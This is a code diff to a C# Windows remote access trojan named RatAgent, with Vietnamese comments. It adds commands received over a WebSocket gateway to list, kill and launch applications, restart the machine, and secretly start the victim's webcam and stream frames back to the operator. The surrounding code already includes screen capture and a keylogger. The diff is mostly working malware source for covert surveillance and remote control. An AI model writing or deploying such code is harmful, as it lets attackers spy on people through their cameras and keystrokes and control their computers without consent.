@@ -11,6 +11,8 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Microsoft.Win32; // QUAN TRỌNG: Để dùng Registry
+using AForge.Video;
+using AForge.Video.DirectShow;
 
 namespace RatAgent
 {
@@ -20,6 +22,10 @@ namespace RatAgent
         // Đổi IP này thành IP máy chạy Node.js
         private readonly string GATEWAY_URL = "ws://localhost:8080";
         private readonly string MY_ID = Environment.MachineName;
+        private FilterInfoCollection videoDevices;
+        private VideoCaptureDevice videoSource;
+        private bool isWebcamRunning = false;
+        private DateTime lastFrameTime = DateTime.MinValue;
 
         public AgentForm()
         {
@@ -113,6 +119,44 @@ namespace RatAgent
                             try { Process.Start(data); } catch { }
                             break;
 
+                        // --- APPLICATIONS ---
+                        case "GET_APPS":
+                            var apps = new List<object>();
+                            foreach (var p in Process.GetProcesses())
+                            {
+                                try
+                                {
+                                    // ĐÂY LÀ ĐIỂM KHÁC BIỆT QUAN TRỌNG GIỮA APPLICATIONS VÀ PROCESSES
+                                    // Chỉ lấy những process có Tiêu đề cửa sổ (Giao diện người dùng)
+                                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
+                                    {
+                                        apps.Add(new
+                                        {
+                                            Id = p.Id,
+                                            Name = p.ProcessName,
+                                            Title = p.MainWindowTitle // Lấy thêm tiêu đề cửa sổ
+                                        });
+                                    }
+                                }
+                                catch { }
+                            }
+                            _ = ReplyTo(requesterId, "APP_LIST", JsonSerializer.Serialize(apps));
+                            break;
+
+                        case "KILL_APP":
+                            try
+                            {
+                                Process.GetProcessById(int.Parse(data)).Kill();
+                                // Hoặc muốn tắt nhẹ nhàng (đóng cửa sổ) thì dùng:
+                                // Process.GetProcessById(int.Parse(data)).CloseMainWindow();
+                            }
+                            catch { }
+                            break;
+
+                        case "START_APP":
+                            try { Process.Start(data); } catch { }
+                            break;
+
                         // --- SCREEN ---
                         case "TAKE_PIC":
                             _ = Task.Run(() => CaptureScreen(requesterId));
@@ -145,6 +189,19 @@ namespace RatAgent
                         // --- SYSTEM ---
                         case "SHUTDOWN":
                             Process.Start("shutdown", "/s /t 0");
+                            break;
+
+                        case "RESTART":
+                            Process.Start("shutdown", "/r /t 0");
+                            break;
+                        // --- WEBCAM ---
+                        case "WEBCAM_START":
+                            StartWebcam(requesterId);
+                            break;
+
+                        case "WEBCAM_STOP":
+                            StopWebcam();
+                            _ = ReplyTo(requesterId, "LOG_MSG", "Đã tắt Webcam.");
                             break;
                     }
                 }
@@ -253,6 +310,102 @@ namespace RatAgent
             catch { }
         }
 
+        // --- HÀM XỬ LÝ WEBCAM ---
+
+        private void StartWebcam(string requesterId)
+        {
+            if (isWebcamRunning) return;
+
+            try
+            {
+                // 1. Lấy danh sách thiết bị video
+                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+
+                if (videoDevices.Count == 0)
+                {
+                    _ = ReplyTo(requesterId, "LOG_MSG", "Lỗi: Không tìm thấy Webcam!");
+                    return;
+                }
+
+                // 2. Chọn thiết bị đầu tiên (Index 0)
+                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+
+                // 3. Đăng ký sự kiện: "Mỗi khi có ảnh mới thì làm gì?"
+                videoSource.NewFrame += (s, e) => VideoSource_NewFrame(s, e, requesterId);
+
+                // 4. Bắt đầu chạy
+                videoSource.Start();
+                isWebcamRunning = true;
+                _ = ReplyTo(requesterId, "LOG_MSG", "Webcam đang chạy...");
+            }
+            catch (Exception ex)
+            {
+                _ = ReplyTo(requesterId, "LOG_MSG", "Lỗi Webcam: " + ex.Message);
+            }
+        }
+
+        private void StopWebcam()
+        {
+            if (videoSource != null && videoSource.IsRunning)
+            {
+                videoSource.SignalToStop();
+                videoSource.WaitForStop();
+                videoSource = null;
+            }
+            isWebcamRunning = false;
+        }
+
+        // --- BỘ ĐẾM & GỬI ẢNH (Hàm này chạy liên tục mỗi khi có Frame mới) ---
+        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs, string targetId)
+        {
+            try
+            {
+                // Giới hạn tốc độ gửi (Ví dụ: tối đa 10 FPS để tránh nghẽn mạng)
+                // Nếu muốn mượt nhất có thể thì bỏ dòng if này đi
+                if ((DateTime.Now - lastFrameTime).TotalMilliseconds < 100) return;
+                lastFrameTime = DateTime.Now;
+
+                // 1. Lấy ảnh từ Webcam (Bitmap gốc)
+                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
+                {
+                    // 2. Resize ảnh nhỏ lại (320px width) để gửi cho nhanh
+                    // Nếu để HD sẽ rất lag
+                    int newWidth = 320;
+                    int newHeight = (int)((float)original.Height / original.Width * newWidth);
+
+                    using (Bitmap resized = new Bitmap(original, newWidth, newHeight))
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        // 3. Nén JPEG chất lượng 50%
+                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
+                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
+                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
+                        myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 50L); // 50% Quality
+
+                        resized.Save(ms, jpgEncoder, myEncoderParameters);
+
+                        // 4. Chuyển sang Base64 và Gửi
+                        string base64 = Convert.ToBase64String(ms.ToArray());
+
+                        // Lưu ý: Gọi hàm gửi async từ sự kiện sync
+                        _ = ReplyTo(targetId, "WEBCAM_FRAME", base64);
+                    }
+                }
+            }
+            catch { }
+        }
+
+        // Hàm phụ trợ lấy Encoder cho JPEG
+        private ImageCodecInfo GetEncoder(ImageFormat format)
+        {
+            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
+            foreach (ImageCodecInfo codec in codecs)
+            {
+                if (codec.FormatID == format.Guid) return codec;
+            }
+            return null;
+        }
+
         private async Task ReplyTo(string targetId, string cmd, string data)
         {
             var packet = new { targetId = targetId, payload = new { cmd = cmd, data = data } };
@@ -271,6 +424,7 @@ namespace RatAgent
 
         private void AgentForm_FormClosing(object sender, FormClosingEventArgs e)
         {
+            StopWebcam();
             KeyLogger.Stop();
         }
     }
